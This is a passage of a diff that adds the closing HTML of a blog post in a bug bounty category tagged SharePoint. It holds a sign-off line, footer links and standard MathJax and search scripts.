+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>Hope you learned something, and thanks for reading ❤.</p>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Machiavelli
+                
+                
+                    
+                    in <a href="https://machiavelli.me/categories/bug-bounty/">Bug Bounty</a>
+                
+                
+                    and
+                    tagged
+                    
+                        <a href="https://machiavelli.me/tags/bugbounty/">BugBounty</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/infosec/">Infosec</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/sharepoint/">SharePoint</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+
+  <!-- optional scripts -->
+  
+  
+  <script src="https://machiavelli.me/js/codeblock.js"></script>
+  
+
+  
+<!-- MathJax script for rendering LaTeX math equations -->
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"],
+      ],
+      displayMath: [
+        ["$$", "$$"],
+        ["\\[", "\\]"],
+      ],
+    },
+  };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+
+
+  
+<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>
+
+
+  
+</body>
+
+</html>
